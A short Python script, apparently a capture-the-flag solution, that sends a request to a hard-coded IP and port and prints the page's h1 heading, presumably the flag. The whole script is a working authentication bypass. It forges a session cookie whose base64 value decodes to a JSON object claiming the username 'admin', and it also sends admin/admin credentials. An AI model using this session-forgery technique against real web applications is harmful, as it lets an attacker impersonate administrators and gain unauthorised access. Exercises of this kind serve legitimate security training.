#!/usr/bin/env python3

import requests

ip = '188.166.175.58'   # change this
port = '32249'          # change this

cookies = { 'PHPSESSID': 'eyJ1c2VybmFtZSI6ImFkbWluIn0K' }
data = { 'username': 'admin', 'password': 'admin' }

r = requests.get(f'http://{ip}:{port}/', data = data, cookies = cookies)

data = r.text
data = data.split('<h1>')[-1]
data = data.split('</h1>')[0]

print(data.strip())
